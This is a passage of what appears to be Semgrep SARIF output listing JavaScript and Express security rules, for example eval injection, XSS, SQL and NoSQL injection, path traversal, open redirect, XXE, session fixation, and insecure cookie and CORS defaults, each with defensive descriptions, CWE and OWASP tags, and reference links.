ected the use of eval(). eval() can be dangerous if used to evaluate dynamic content. If this content can be input from outside the program, this may be a code injection vulnerability. Ensure evaluated content is not definable by external sources."},"helpUri":"https://semgrep.dev/r/javascript.browser.security.eval-detected.eval-detected","id":"javascript.browser.security.eval-detected.eval-detected","name":"javascript.browser.security.eval-detected.eval-detected","properties":{"precision":"very-high","tags":["CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')","LOW CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.browser.security.eval-detected.eval-detected"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"User controlled data in methods like `innerHTML`, `outerHTML` or `document.write` is an anti-pattern that can lead to XSS vulnerabilities"},"help":{"markdown":"User controlled data in methods like `innerHTML`, `outerHTML` or `document.write` is an anti-pattern that can lead to XSS vulnerabilities\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.browser.security.insecure-document-method.insecure-document-method)\n - [https://owasp.org/Top10/A03_2021-Injection](https://owasp.org/Top10/A03_2021-Injection)\n","text":"User controlled data in methods like `innerHTML`, `outerHTML` or `document.write` is an anti-pattern that can lead to XSS vulnerabilities"},"helpUri":"https://semgrep.dev/r/javascript.browser.security.insecure-document-method.insecure-document-method","id":"javascript.browser.security.insecure-document-method.insecure-document-method","name":"javascript.browser.security.insecure-document-method.insecure-document-method","properties":{"precision":"very-high","tags":["CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","LOW CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A07:2017 - Cross-Site Scripting (XSS)","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.browser.security.insecure-document-method.insecure-document-method"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"The application might dynamically evaluate untrusted input, which can lead to a code injection vulnerability. An attacker can execute arbitrary code, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing code containing user input. If this is unavoidable, validate and sanitize the input, and use safe alternatives for evaluating user input."},"help":{"markdown":"The application might dynamically evaluate untrusted input, which can lead to a code injection vulnerability. An attacker can execute arbitrary code, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing code containing user input. If this is unavoidable, validate and sanitize the input, and use safe alternatives for evaluating user input.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.code.eval-express.eval-express)\n - [https://owasp.org/Top10/2025/A05_2025-Injection/](https://owasp.org/Top10/2025/A05_2025-Injection/)\n - [https://owasp.org/Top10/A03_2021-Injection](https://owasp.org/Top10/A03_2021-Injection)\n","text":"The application might dynamically evaluate untrusted input, which can lead to a code injection vulnerability. An attacker can execute arbitrary code, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing code containing user input. If this is unavoidable, validate and sanitize the input, and use safe alternatives for evaluating user input."},"helpUri":"https://semgrep.dev/r/javascript.express.code.eval-express.eval-express","id":"javascript.express.code.eval-express.eval-express","name":"javascript.express.code.eval-express.eval-express","properties":{"precision":"very-high","tags":["CWE-94: Improper Control of Generation of Code ('Code Injection')","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.code.eval-express.eval-express"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"The application might dynamically evaluate untrusted input, which can lead to a code injection vulnerability. An attacker can execute arbitrary code, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing code containing user input. If this is unavoidable, validate and sanitize the input, and use safe alternatives for evaluating user input."},"help":{"markdown":"The application might dynamically evaluate untrusted input, which can lead to a code injection vulnerability. An attacker can execute arbitrary code, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing code containing user input. If this is unavoidable, validate and sanitize the input, and use safe alternatives for evaluating user input.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.code.vm-express.vm-express)\n - [https://owasp.org/Top10/2025/A05_2025-Injection/](https://owasp.org/Top10/2025/A05_2025-Injection/)\n - [https://owasp.org/Top10/A03_2021-Injection](https://owasp.org/Top10/A03_2021-Injection)\n","text":"The application might dynamically evaluate untrusted input, which can lead to a code injection vulnerability. An attacker can execute arbitrary code, potentially gaining complete control of the system. To prevent this vulnerability, avoid executing code containing user input. If this is unavoidable, validate and sanitize the input, and use safe alternatives for evaluating user input."},"helpUri":"https://semgrep.dev/r/javascript.express.code.vm-express.vm-express","id":"javascript.express.code.vm-express.vm-express","name":"javascript.express.code.vm-express.vm-express","properties":{"precision":"very-high","tags":["CWE-94: Improper Control of Generation of Code ('Code Injection')","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.code.vm-express.vm-express"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Untrusted input might be used to build a database query, which can lead to a SQL injection vulnerability. An attacker can execute malicious SQL statements and gain unauthorized access to sensitive data, modify, delete data, or execute arbitrary system commands. To prevent this vulnerability, use prepared statements that do not concatenate user-controllable strings and use parameterized queries where SQL commands and user data are strictly separated. Also, consider using an object-relational (ORM) framework to operate with safer abstractions."},"help":{"markdown":"Untrusted input might be used to build a database query, which can lead to a SQL injection vulnerability. An attacker can execute malicious SQL statements and gain unauthorized access to sensitive data, modify, delete data, or execute arbitrary system commands. To prevent this vulnerability, use prepared statements that do not concatenate user-controllable strings and use parameterized queries where SQL commands and user data are strictly separated. Also, consider using an object-relational (ORM) framework to operate with safer abstractions.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.db.sequelize-express.sequelize-express)\n - [https://owasp.org/Top10/2025/A05_2025-Injection/](https://owasp.org/Top10/2025/A05_2025-Injection/)\n - [https://owasp.org/Top10/A03_2021-Injection](https://owasp.org/Top10/A03_2021-Injection)\n","text":"Untrusted input might be used to build a database query, which can lead to a SQL injection vulnerability. An attacker can execute malicious SQL statements and gain unauthorized access to sensitive data, modify, delete data, or execute arbitrary system commands. To prevent this vulnerability, use prepared statements that do not concatenate user-controllable strings and use parameterized queries where SQL commands and user data are strictly separated. Also, consider using an object-relational (ORM) framework to operate with safer abstractions."},"helpUri":"https://semgrep.dev/r/javascript.express.db.sequelize-express.sequelize-express","id":"javascript.express.db.sequelize-express.sequelize-express","name":"javascript.express.db.sequelize-express.sequelize-express","properties":{"precision":"very-high","tags":["CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')","HIGH CONFIDENCE","OWASP-A01:2017 - Injection","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.db.sequelize-express.sequelize-express"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"The application builds a file path from potentially untrusted data, which can lead to a path traversal vulnerability. An attacker can manipulate the path which the application uses to access files. If the application does not validate user input and sanitize file paths, sensitive files such as configuration or user data can be accessed, potentially creating or overwriting files. To prevent this vulnerability, validate and sanitize any input that is used to create references to file paths. Also, enforce strict file access controls. For example, choose privileges allowing public-facing applications to access only the required files."},"help":{"markdown":"The application builds a file path from potentially untrusted data, which can lead to a path traversal vulnerability. An attacker can manipulate the path which the application uses to access files. If the application does not validate user input and sanitize file paths, sensitive files such as configuration or user data can be accessed, potentially creating or overwriting files. To prevent this vulnerability, validate and sanitize any input that is used to create references to file paths. Also, enforce strict file access controls. For example, choose privileges allowing public-facing applications to access only the required files.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.file.fs-express.fs-express)\n - [https://nodejs.org/api/fs.html#promises-api](https://nodejs.org/api/fs.html#promises-api)\n - [https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)\n - [https://owasp.org/Top10/A01_2021-Broken_Access_Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control)\n - [https://owasp.org/www-community/attacks/Path_Traversal](https://owasp.org/www-community/attacks/Path_Traversal)\n - [https://portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal)\n","text":"The application builds a file path from potentially untrusted data, which can lead to a path traversal vulnerability. An attacker can manipulate the path which the application uses to access files. If the application does not validate user input and sanitize file paths, sensitive files such as configuration or user data can be accessed, potentially creating or overwriting files. To prevent this vulnerability, validate and sanitize any input that is used to create references to file paths. Also, enforce strict file access controls. For example, choose privileges allowing public-facing applications to access only the required files."},"helpUri":"https://semgrep.dev/r/javascript.express.file.fs-express.fs-express","id":"javascript.express.file.fs-express.fs-express","name":"javascript.express.file.fs-express.fs-express","properties":{"precision":"very-high","tags":["CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A05:2017 - Broken Access Control","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.file.fs-express.fs-express"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Detected a `$IMPORT` statement that comes from a `$REQ` argument. This could lead to NoSQL injection if the variable is user-controlled and is not properly sanitized. Be sure to properly sanitize the data if you absolutely must pass request data into a mongo query."},"help":{"markdown":"Detected a `$IMPORT` statement that comes from a `$REQ` argument. This could lead to NoSQL injection if the variable is user-controlled and is not properly sanitized. Be sure to properly sanitize the data if you absolutely must pass request data into a mongo query.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.mongodb.express-mongo-nosqli.express-mongo-nosqli)\n - [https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf)\n","text":"Detected a `$IMPORT` statement that comes from a `$REQ` argument. This could lead to NoSQL injection if the variable is user-controlled and is not properly sanitized. Be sure to properly sanitize the data if you absolutely must pass request data into a mongo query."},"helpUri":"https://semgrep.dev/r/javascript.express.mongodb.express-mongo-nosqli.express-mongo-nosqli","id":"javascript.express.mongodb.express-mongo-nosqli.express-mongo-nosqli","name":"javascript.express.mongodb.express-mongo-nosqli.express-mongo-nosqli","properties":{"precision":"very-high","tags":["CWE-943: Improper Neutralization of Special Elements in Data Query Logic","MEDIUM CONFIDENCE","OWASP-A01:2017 - Injection","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.mongodb.express-mongo-nosqli.express-mongo-nosqli"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"The application builds a URL using user-controlled input which can lead to an open redirect vulnerability. An attacker can manipulate the URL and redirect users to an arbitrary domain. Open redirect vulnerabilities can lead to issues such as Cross-site scripting (XSS) or redirecting to a malicious domain for activities such as phishing to capture users' credentials. To prevent this vulnerability perform strict input validation of the domain against an allowlist of approved domains. Notify a user in your application that they are leaving the website. Display a domain where they are redirected to the user. A user can then either accept or deny the redirect to an untrusted site."},"help":{"markdown":"The application builds a URL using user-controlled input which can lead to an open redirect vulnerability. An attacker can manipulate the URL and redirect users to an arbitrary domain. Open redirect vulnerabilities can lead to issues such as Cross-site scripting (XSS) or redirecting to a malicious domain for activities such as phishing to capture users' credentials. To prevent this vulnerability perform strict input validation of the domain against an allowlist of approved domains. Notify a user in your application that they are leaving the website. Display a domain where they are redirected to the user. A user can then either accept or deny the redirect to an untrusted site.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.open-redirect-deepsemgrep.open-redirect-deepsemgrep)\n - [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)\n","text":"The application builds a URL using user-controlled input which can lead to an open redirect vulnerability. An attacker can manipulate the URL and redirect users to an arbitrary domain. Open redirect vulnerabilities can lead to issues such as Cross-site scripting (XSS) or redirecting to a malicious domain for activities such as phishing to capture users' credentials. To prevent this vulnerability perform strict input validation of the domain against an allowlist of approved domains. Notify a user in your application that they are leaving the website. Display a domain where they are redirected to the user. A user can then either accept or deny the redirect to an untrusted site."},"helpUri":"https://semgrep.dev/r/javascript.express.open-redirect-deepsemgrep.open-redirect-deepsemgrep","id":"javascript.express.open-redirect-deepsemgrep.open-redirect-deepsemgrep","name":"javascript.express.open-redirect-deepsemgrep.open-redirect-deepsemgrep","properties":{"precision":"very-high","tags":["CWE-601: URL Redirection to Untrusted Site ('Open Redirect')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.open-redirect-deepsemgrep.open-redirect-deepsemgrep"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories and files. It is recommended to disable directory listing unless it is a public resource. If you need directory listing, ensure that sensitive files are inaccessible when querying the resource."},"help":{"markdown":"Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories and files. It is recommended to disable directory listing unless it is a public resource. If you need directory listing, ensure that sensitive files are inaccessible when querying the resource.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing)\n - [https://www.npmjs.com/package/serve-index](https://www.npmjs.com/package/serve-index)\n - [https://www.acunetix.com/blog/articles/directory-listing-information-disclosure/](https://www.acunetix.com/blog/articles/directory-listing-information-disclosure/)\n","text":"Directory listing/indexing is enabled, which may lead to disclosure of sensitive directories and files. It is recommended to disable directory listing unless it is a public resource. If you need directory listing, ensure that sensitive files are inaccessible when querying the resource."},"helpUri":"https://semgrep.dev/r/javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing","id":"javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing","name":"javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing","properties":{"precision":"very-high","tags":["CWE-548: Exposure of Information Through Directory Listing","MEDIUM CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A06:2017 - Security Misconfiguration","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.security.audit.express-check-directory-listing.express-check-directory-listing"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Detected usage of the `notevil` package, which is unmaintained and has vulnerabilities. Using any sort of `eval()` functionality can be very dangerous, but if you must, the `eval` package is an up to date alternative. Be sure that only trusted input reaches an `eval()` function."},"help":{"markdown":"Detected usage of the `notevil` package, which is unmaintained and has vulnerabilities. Using any sort of `eval()` functionality can be very dangerous, but if you must, the `eval` package is an up to date alternative. Be sure that only trusted input reaches an `eval()` function.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.security.audit.express-detect-notevil-usage.express-detect-notevil-usage)\n - [https://github.com/mmckegg/notevil](https://github.com/mmckegg/notevil)\n","text":"Detected usage of the `notevil` package, which is unmaintained and has vulnerabilities. Using any sort of `eval()` functionality can be very dangerous, but if you must, the `eval` package is an up to date alternative. Be sure that only trusted input reaches an `eval()` function."},"helpUri":"https://semgrep.dev/r/javascript.express.security.audit.express-detect-notevil-usage.express-detect-notevil-usage","id":"javascript.express.security.audit.express-detect-notevil-usage.express-detect-notevil-usage","name":"javascript.express.security.audit.express-detect-notevil-usage.express-detect-notevil-usage","properties":{"precision":"very-high","tags":["CWE-1104: Use of Unmaintained Third Party Components","LOW CONFIDENCE","OWASP-A03:2025 - Software Supply Chain Failures","OWASP-A06:2021 - Vulnerable and Outdated Components","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.security.audit.express-detect-notevil-usage.express-detect-notevil-usage"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Detected use of parseXml() function with the `noent` field set to `true`. This can lead to an XML External Entities (XXE) attack if untrusted data is passed into it."},"help":{"markdown":"Detected use of parseXml() function with the `noent` field set to `true`. This can lead to an XML External Entities (XXE) attack if untrusted data is passed into it.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.security.audit.express-libxml-vm-noent.express-libxml-vm-noent)\n - [https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)\n","text":"Detected use of parseXml() function with the `noent` field set to `true`. This can lead to an XML External Entities (XXE) attack if untrusted data is passed into it."},"helpUri":"https://semgrep.dev/r/javascript.express.security.audit.express-libxml-vm-noent.express-libxml-vm-noent","id":"javascript.express.security.audit.express-libxml-vm-noent.express-libxml-vm-noent","name":"javascript.express.security.audit.express-libxml-vm-noent.express-libxml-vm-noent","properties":{"precision":"very-high","tags":["CWE-611: Improper Restriction of XML External Entity Reference","LOW CONFIDENCE","OWASP-A02:2025 - Security Misconfiguration","OWASP-A04:2017 - XML External Entities (XXE)","OWASP-A05:2021 - Security Misconfiguration","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.security.audit.express-libxml-vm-noent.express-libxml-vm-noent"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"The application redirects to a URL specified by user-supplied input `$REQ` that is not validated. This could redirect users to malicious locations. Consider using an allow-list approach to validate URLs, or warn users they are being redirected to a third-party website."},"help":{"markdown":"The application redirects to a URL specified by user-supplied input `$REQ` that is not validated. This could redirect users to malicious locations. Consider using an allow-list approach to validate URLs, or warn users they are being redirected to a third-party website.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.security.audit.express-open-redirect.express-open-redirect)\n - [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)\n","text":"The application redirects to a URL specified by user-supplied input `$REQ` that is not validated. This could redirect users to malicious locations. Consider using an allow-list approach to validate URLs, or warn users they are being redirected to a third-party website."},"helpUri":"https://semgrep.dev/r/javascript.express.security.audit.express-open-redirect.express-open-redirect","id":"javascript.express.security.audit.express-open-redirect.express-open-redirect","name":"javascript.express.security.audit.express-open-redirect.express-open-redirect","properties":{"precision":"very-high","tags":["CWE-601: URL Redirection to Untrusted Site ('Open Redirect')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.security.audit.express-open-redirect.express-open-redirect"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"The application processes user-input, this is passed to res.sendFile which can allow an attacker to arbitrarily read files on the system through path traversal. It is recommended to perform input validation in addition to canonicalizing the path. This allows you to validate the path against the intended directory it should be accessing."},"help":{"markdown":"The application processes user-input, this is passed to res.sendFile which can allow an attacker to arbitrarily read files on the system through path traversal. It is recommended to perform input validation in addition to canonicalizing the path. This allows you to validate the path against the intended directory it should be accessing.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.security.audit.express-res-sendfile.express-res-sendfile)\n - [https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)\n","text":"The application processes user-input, this is passed to res.sendFile which can allow an attacker to arbitrarily read files on the system through path traversal. It is recommended to perform input validation in addition to canonicalizing the path. This allows you to validate the path against the intended directory it should be accessing."},"helpUri":"https://semgrep.dev/r/javascript.express.security.audit.express-res-sendfile.express-res-sendfile","id":"javascript.express.security.audit.express-res-sendfile.express-res-sendfile","name":"javascript.express.security.audit.express-res-sendfile.express-res-sendfile","properties":{"precision":"very-high","tags":["CWE-73: External Control of File Name or Path","MEDIUM CONFIDENCE","OWASP-A04:2021 - Insecure Design","OWASP-A06:2025 - Insecure Design","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.security.audit.express-res-sendfile.express-res-sendfile"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Bracket object notation with user input is present, this might allow an attacker to access all properties of the object and even it's prototype. Use literal values for object properties."},"help":{"markdown":"Bracket object notation with user input is present, this might allow an attacker to access all properties of the object and even it's prototype. Use literal values for object properties.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.security.audit.remote-property-injection.remote-property-injection)\n - [https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md](https://github.com/nodesecurity/eslint-plugin-security/blob/3c7522ca1be800353513282867a1034c795d9eb4/docs/the-dangers-of-square-bracket-notation.md)\n","text":"Bracket object notation with user input is present, this might allow an attacker to access all properties of the object and even it's prototype. Use literal values for object properties."},"helpUri":"https://semgrep.dev/r/javascript.express.security.audit.remote-property-injection.remote-property-injection","id":"javascript.express.security.audit.remote-property-injection.remote-property-injection","name":"javascript.express.security.audit.remote-property-injection.remote-property-injection","properties":{"precision":"very-high","tags":["CWE-522: Insufficiently Protected Credentials","LOW CONFIDENCE","OWASP-A02:2017 - Broken Authentication","OWASP-A04:2021 - Insecure Design","OWASP-A06:2025 - Insecure Design","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.security.audit.remote-property-injection.remote-property-injection"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Detected an explicit unescape in a Pug template, using either '!=' or '!{...}'. If external data can reach these locations, your application is exposed to a cross-site scripting (XSS) vulnerability. If you must do this, ensure no external data can reach this location."},"help":{"markdown":"Detected an explicit unescape in a Pug template, using either '!=' or '!{...}'. If external data can reach these locations, your application is exposed to a cross-site scripting (XSS) vulnerability. If you must do this, ensure no external data can reach this location.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.security.audit.xss.pug.explicit-unescape.template-explicit-unescape)\n - [https://pugjs.org/language/code.html#unescaped-buffered-code](https://pugjs.org/language/code.html#unescaped-buffered-code)\n - [https://pugjs.org/language/attributes.html#unescaped-attributes](https://pugjs.org/language/attributes.html#unescaped-attributes)\n","text":"Detected an explicit unescape in a Pug template, using either '!=' or '!{...}'. If external data can reach these locations, your application is exposed to a cross-site scripting (XSS) vulnerability. If you must do this, ensure no external data can reach this location."},"helpUri":"https://semgrep.dev/r/javascript.express.security.audit.xss.pug.explicit-unescape.template-explicit-unescape","id":"javascript.express.security.audit.xss.pug.explicit-unescape.template-explicit-unescape","name":"javascript.express.security.audit.xss.pug.explicit-unescape.template-explicit-unescape","properties":{"precision":"very-high","tags":["CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","LOW CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A07:2017 - Cross-Site Scripting (XSS)","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.security.audit.xss.pug.explicit-unescape.template-explicit-unescape"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Detected `$REQ` argument which enters `$RES.$HEADER`, this can lead to session fixation vulnerabilities if an attacker can control the cookie value. This vulnerability can lead to unauthorized access to accounts, and in some esoteric cases, Cross-Site-Scripting (XSS). Users should not be able to influence cookies directly, for session cookies, they should be generated securely using an approved session management library. If the cookie does need to be set by a user, consider using an allow-list based approach to restrict the cookies which can be set."},"help":{"markdown":"Detected `$REQ` argument which enters `$RES.$HEADER`, this can lead to session fixation vulnerabilities if an attacker can control the cookie value. This vulnerability can lead to unauthorized access to accounts, and in some esoteric cases, Cross-Site-Scripting (XSS). Users should not be able to influence cookies directly, for session cookies, they should be generated securely using an approved session management library. If the cookie does need to be set by a user, consider using an allow-list based approach to restrict the cookies which can be set.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.session-fixation.session-fixation)\n - [https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures)\n - [https://owasp.org/www-community/attacks/Session_fixation](https://owasp.org/www-community/attacks/Session_fixation)\n","text":"Detected `$REQ` argument which enters `$RES.$HEADER`, this can lead to session fixation vulnerabilities if an attacker can control the cookie value. This vulnerability can lead to unauthorized access to accounts, and in some esoteric cases, Cross-Site-Scripting (XSS). Users should not be able to influence cookies directly, for session cookies, they should be generated securely using an approved session management library. If the cookie does need to be set by a user, consider using an allow-list based approach to restrict the cookies which can be set."},"helpUri":"https://semgrep.dev/r/javascript.express.session-fixation.session-fixation","id":"javascript.express.session-fixation.session-fixation","name":"javascript.express.session-fixation.session-fixation","properties":{"precision":"very-high","tags":["CWE-384: Session Fixation","MEDIUM CONFIDENCE","OWASP-A02:2017 - Broken Authentication","OWASP-A07:2021 - Identification and Authentication Failures","OWASP-A07:2025 - Authentication Failures","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.session-fixation.session-fixation"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Having default cookie settings is insecure because they often lack critical security attributes, leaving cookies vulnerable to various attacks like CSRF or XSS. Always configure cookies with security attributes: `HttpOnly`, `Secure`, `SameSite`."},"help":{"markdown":"Having default cookie settings is insecure because they often lack critical security attributes, leaving cookies vulnerable to various attacks like CSRF or XSS. Always configure cookies with security attributes: `HttpOnly`, `Secure`, `SameSite`.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.web.cookies-default-express.cookies-default-express)\n - [https://cwe.mitre.org/data/definitions/732.html](https://cwe.mitre.org/data/definitions/732.html)\n - [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)\n","text":"Having default cookie settings is insecure because they often lack critical security attributes, leaving cookies vulnerable to various attacks like CSRF or XSS. Always configure cookies with security attributes: `HttpOnly`, `Secure`, `SameSite`."},"helpUri":"https://semgrep.dev/r/javascript.express.web.cookies-default-express.cookies-default-express","id":"javascript.express.web.cookies-default-express.cookies-default-express","name":"javascript.express.web.cookies-default-express.cookies-default-express","properties":{"precision":"very-high","tags":["CWE-732: Incorrect Permission Assignment for Critical Resource","HIGH CONFIDENCE","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.web.cookies-default-express.cookies-default-express"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Having default CORS settings is insecure because they often allow overly permissive cross-origin access, exposing your application to unauthorized data sharing, potentially exposing sensitive data to malicious websites. Avoid using wildcard (*) origins, especially for endpoints that handle sensitive data. Use a restrictive CORS policy by explicitly specifying trusted origins in the Access-Control-Allow-Origin header."},"help":{"markdown":"Having default CORS settings is insecure because they often allow overly permissive cross-origin access, exposing your application to unauthorized data sharing, potentially exposing sensitive data to malicious websites. Avoid using wildcard (*) origins, especially for endpoints that handle sensitive data. Use a restrictive CORS policy by explicitly specifying trusted origins in the Access-Control-Allow-Origin header.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/r/javascript.express.web.cors-default-config-express.cors-default-config-express)\n - [https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/)\n - [https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures)\n - [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)\n","text":"Having default CORS settings is insecure because they often allow overly permissive cross-origin access, exposing your application to unauthorized data sharing, potentially exposing sensitive data to malicious websites. Avoid using wildcard (*) origins, especially for endpoints that handle sensitive data. Use a restrictive CORS policy by explicitly specifying trusted origins in the Access-Control-Allow-Origin header."},"helpUri":"https://semgrep.dev/r/javascript.express.web.cors-default-config-express.cors-default-config-express","id":"javascript.express.web.cors-default-config-express.cors-default-config-express","name":"javascript.express.web.cors-default-config-express.cors-default-config-express","properties":{"precision":"very-high","tags":["CWE-346: Origin Validation Error","HIGH CONFIDENCE","OWASP-A07:2021 - Identification and Authentication Failures","OWASP-A07:2025 - Authentication Failures","rule-board-audit","security"]},"shortDescription":{"text":"Semgrep Finding: javascript.express.web.cors-default-config-express.cors-default-config-express"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"The application builds a URL using user-controlled input which can lead to an open redirect vulnerability. An attacker can manipulate the URL and redirect users to an arbitrary domain. Open redirect vulnerabilities can lead to issues such as Cross-site scripting (XSS) or redirecting to a malicious domain for activities such as phishing to capture users' credentials. To prevent this vulnerability perform strict input validation of the domain against an allowlist of approved domains. Notify a user in your application that they are leaving the website. Display a domain where they are redirected to the user. A user can then either accept or deny the redirect to an untrusted site."},"help":{"markdown":"The application builds a URL using user-controlled input which can lead to an open redirect vulnerability. An attacker can manipulate the URL and redirect users to an arbitrary domain. Open redirect vulnerabilities can lead to issues such as Cross-site scripting (XSS) or redirecting to a malicious domain for activities such as phishing to capture users' credentials. To prevent this vulnerability perform strict input validation of the domain against an allowlist of approved domains. Notify a user in your application that they are leaving the website. Display a domain where they are redirected to the user. A user can then either accept or deny the redirect to an untrusted site.\n\n<b>References:</b>\n - [Semgrep 